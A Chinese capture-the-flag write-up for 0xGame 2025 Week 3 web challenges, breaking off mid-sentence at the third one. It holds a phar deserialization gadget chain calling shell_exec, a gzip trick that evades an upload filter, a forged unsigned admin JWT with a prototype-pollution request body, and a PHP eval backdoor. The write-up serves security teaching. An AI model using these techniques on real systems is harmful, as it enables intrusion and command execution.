---
title: "0xgame2025Week3题解"
date: 2025-10-16T15:07:53+08:00
summary: "0xgame2025Week3题解"
url: "/posts/0xgame2025Week3题解/"
categories:
  - "赛题wp"
tags:
  - "0xgame2025"
draft: true
---

# 前言

本身是不想写wp的，但是不得不说week3的题目有些地方确实是自己没学到，所以还是写写吧

# 题解

## 文件查询器（蓝）

### #phar文件上传gzip绕过

一个上传文件和查询文件的口子，一开始兜兜转转了好久，打文件上传没打上去，后面灵机一动想到用查询文件去看源代码

盲猜一手index.php拿到base64编码字符串

关键代码

```php
...
<?php
error_reporting(0);
class MaHaYu{
    public $HG2;
    public $ToT;
    public $FM2tM;
    public function __construct()
    {
      $this -> ZombiegalKawaii();
    }
    
    public function ZombiegalKawaii()
    {
      $HG2 = $this -> HG2;
      if(preg_match("/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i",$HG2))
      {
        die("这这这你也该绕过去了吧");
      }
      else{
        $this -> ToT = "这其实是来占位的";

      }
    }

    public function __destruct()
    {
      $HG2 = $this -> HG2;
      $FM2tM = $this -> FM2tM;
      echo "Wow";
      var_dump($HG2($FM2tM));
    }
}

$file=$_POST['file'];
if(isset($_POST['file']))
{
    if (preg_match("/'[\$%&#@*]|flag|file|base64|go|git|login|dict|base|echo|content|read|convert|filter|date|plain|text|;|<|>/i", $file))
    {
        die("对方撤回了一个请求，并企图萌混过关");
    }
    echo base64_encode(file_get_contents($file));
}
```

很明显这里的利用点就是在`__destruct()`中的动态函数调用，但是对`$HG2`有限制

```php
if(preg_match("/system|print|readfile|get|assert|passthru|nl|flag|ls|scandir|check|cat|tac|echo|eval|rev|report|dir/i",$HG2))
      {
        die("这这这你也该绕过去了吧");
      }
      else{
        $this -> ToT = "这其实是来占位的";

      }
```

找一个能执行命令且只有一个参数的函数就行了，一开始用的exec，但是exec只会输出结果的最后一行，换成shell_exec就行了

这里还对查询文件的参数file进行了过滤，结合上面的反序列化可以想到打phar反序列化

构造gadget链

```php
<?php
class MaHaYu{
    public $HG2;
    public $ToT;
    public $FM2tM;
}
$phar = new phar('test.phar');//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$a = new MaHaYu();
$a -> FM2tM = "whoami";
$a -> HG2 = "shell_exec";
$phar->setMetadata($a);//自定义的meta-data存入manifest
$phar->addFromString("flag.txt","flag");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

将phar后缀改成jpg上传但是被waf拦截了，可能还是有过滤

通过抓包看到上传的url路径是upload.php，尝试查询一下这个文件

```php
<?php
error_reporting(0);
$White_List = array("jpg", "png", "pdf");
$temp = explode(".", $_FILES["file"]["name"]);
$extension = end($temp);
if (($_FILES["file"]["size"] && in_array($extension, $White_List)))
{
    $content=file_get_contents($_FILES["file"]["tmp_name"]);
    $pos = strpos($content, "__HALT_COMPILER();");	//过滤点在这
    if(gettype($pos)==="integer")
    {
        die("你猜我想让你干什么喵");
    }
    else
    {
        if (file_exists("./upload/" . $_FILES["file"]["name"]))
        {
            echo $_FILES["file"]["name"] . " Already exists. ";
        }
        else
        { 
            $file = fopen("./upload/".$_FILES["file"]["name"], "w");
            fwrite($file, $content); 
            fclose($file);
            echo "Success ./upload/".$_FILES["file"]["name"];
        }
    }
}
else
{ 
    echo "请重新尝试喵"; 
} 
?>
```

可以看到过滤点了，网上也有绕过方法，一个是将phar内容写入到zip注释中，一个是用gzip去压缩phar文件

我是用的gzip去压缩phar文件

```git
gzip test.phar
```

将生成的test.phar.zip后缀改成jpg上传，然后用phar协议去触发反序列化就行了

## 长夜月

先分析一下源码（比较长，可以直接跳过）

```javascript
const fs = require('fs');
const express = require('express');
//const session = require('express-session');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const crypto = require("crypto");
const cookieParser = require('cookie-parser');
 const DEFAULT_CONFIG = {
     name: "EverNight",
     default_path: "The Remembrance",
     place: "Amphoreus",
     min_public_time: "2025-08-03"
};
const CONFIG = {
    name: "EverNight",
    default_path: "The Remembrance",
    place: "Amphoreus"
}
```

导入的一些依赖，可以看到这里主要是用到jwt库去进行身份验证

```javascript

const users = new Map();
const FLAG = process.env.FLAG || 'oXgAmE{Just_A_Flag}'
const JWT_SECRET = crypto.randomBytes(32).toString('hex');

const app = express(); 
app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());
```

创建一个Map类型的users存储用户信息，jwt密钥是随机生成的，然后就是一些基础配置

```javascript
if (!fs.existsSync('p@sswd.txt')) {
    fs.writeFileSync('p@sswd.txt', crypto.randomBytes(16).toString('hex').trim());
}

users.set('admin', fs.readFileSync('p@sswd.txt').toString())
```

配置管理员admin的密码，如果文件中没有就随机生成密码写入文本

```javascript
function merge(dst, src) {
    if (typeof dst !== "object" || typeof src !== "object") return dst;
    for (let key in src) {
        if (key in src && key in dst) {
            merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}
```

merge函数，把 `src` 对象里的内容递归地合并到 `dst` 对象里

```javascript
function generateJWT(username, password) {
    return jwt.sign({ username, password }, JWT_SECRET, { expiresIn: '10h' });
}
```

生成包含用户名和密码的JWTtoken，有效期是10小时

```javascript
function Check(token){
    if(!token){
        res.redirect('/login');
    }
    const data = jwt.decode(token);
    
    if(data.username === "admin"){
        return true;
    } else{
        return false;
    }
}
```

需要注意这里用的是`jwt.decode`而不是`jwt.verify`，`jwt.decode`只是单纯的解析token而不会进行检测，仅仅解析 JWT 的 **payload（载荷）** 和 **header（头部）**。

```javascript
function Admin_Check(req, res, next){
    const token = req.cookies.token || req.headers.authorization?.split(' ')[1];

    if(!token){
        return res.redirect('/login', {message: "Need Login!"});
    }

    try{
        const data = jwt.decode(token);
        if(data.username === 'admin'){
            return next();
        } else{
            return res.redirect('/trailblazer');
        }
    } catch (err){
        return res.redirect('/login');
    }
}
```

从 请求的Cookie 或 Authorization 头获取 token，这里的话也是用`jwt.decode`去解析token的

调用 `next()` 表示当前中间件验证通过，继续执行下一个中间件或路由处理函数

```javascript
app.get('/', (req, res) => {
    res.render('index');
})

app.get('/login', (req, res) => {
    res.render('login');
})

app.get('/register', (req, res) => {
    res.render('register', { message: '' });
});

app.get('/logout', (req, res) => {
    res.clearCookie('token');
    res.redirect('/login');
});
app.get('/admin_club1st', Admin_Check, (req, res) => { 
    return res.render('admin');
})
app.get('/trailblazer', (req, res) => {
    return res.render('trailblazer', {message: "Failed Amphoreus"})
})
```

定义路由和渲染页面

```javascript
app.post('/login', (req, res) => {
    let username = req.body.username;
    let password = req.body.password;
    let token = req.cookies.token || req.headers.authorization?.split(' ')[1];

    if (!users.has(username)) {
        return res.render('login', { message: 'Invalid username or password.' });
    }

    if (users.get(username) !== password) {
        return res.render('login', { message: 'Invalid username or password.' });
    }

    if(Check(token)){
        res.redirect('/admin_club1st');
    } else{
        res.redirect('/trailblazer');
    }
});
```

这里有一个check函数的调用，检测用户身份是否是admin

```javascript
app.post('/register', (req, res) => {
    let username = req.body.username;
    let password = req.body.password;

    if (users.has(username)) {
        return res.render('register', { message: 'Username already exists.' });
    }

    users.set(username, password);
    const data = generateJWT(username, password);
    res.cookie('token', data, {httpOnly: false});
    res.redirect('/login');
});
```

注册路由的处理逻辑，注册新用户并生成新的JWTtoken

```javascript
app.post('/admin_club1st', Admin_Check, (req, res) => {
    let body = req.body;
    let evernight = Object.create(CONFIG);
    let min_public_time = CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time;
    merge(evernight, body);    
    let en = Object.create(CONFIG);

    if (en.min_public_time < "2025-08-03") {
        return res.render('march7th', {message: FLAG});
    }

    return res.render('evernight');
});
```

这里的话就是主要漏洞代码了，这里能进行对象合并merge，拿到flag的要求是`en.min_public_time`要小于2025-08-03

但是这里的话有一个中间件函数Admin_Check，在路由执行前会先调用这个函数进行身份验证

所以目标明确了，我们需要污染evernight的原型类CONFIG中的min_public_time小于2025-08-03，这样就能拿到flag了

```json
// POST 请求体
{
  "__proto__": {
    "min_public_time": "2025-08-02"  // 小于 2025-08-03
  }
}
```

但前提是jwt伪造admin，直接注册登录后将jwt改一下admin就行，密码没有验证

最后的请求包

```http
POST /admin_club1st HTTP/1.1
Host: 80-9bfd53e9-a3af-405b-a5f9-b7ed10d4238a.challenge.ctfplus.cn
Accept: */*
Origin: http://80-9bfd53e9-a3af-405b-a5f9-b7ed10d4238a.challenge.ctfplus.cn
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Content-Type: application/json
Referer: http://80-9bfd53e9-a3af-405b-a5f9-b7ed10d4238a.challenge.ctfplus.cn/admin_club1st
Accept-Language: zh-CN,zh;q=0.9
Cookie: _clck=b8xro6%5E2%5Eg07%5E0%5E2101; _clsk=18uvume%5E1760582865031%5E1%5E1%5Ei.clarity.ms%2Fcollect; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJ0ZXN0MTIzIiwiaWF0IjoxNzYwNjA5MjMzLCJleHAiOjE3NjA2NDUyMzN9.fake_signature_not_verified
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJ0ZXN0MTIzIiwiaWF0IjoxNzYwNjA5MjMzLCJleHAiOjE3NjA2NDUyMzN9.fake_signature_not_verified
Content-Length: 104

{
  "__proto__": {
    "min_public_time": "2000-01-01"
  }
}
```

![image-20251016181347377](image/image-20251016181347377.png)

## 放开我的变量

打开是一个博客系统，扫目录找到一个/robots.txt，获取到/asdback.php

```php
<?php

highlight_file(__FILE__);
echo("Please Input Your CMD");
$cmd = $_POST['__0xGame2025phpPsAux'];
eval($cmd);
?> Please Input Your CMD
```

跟php
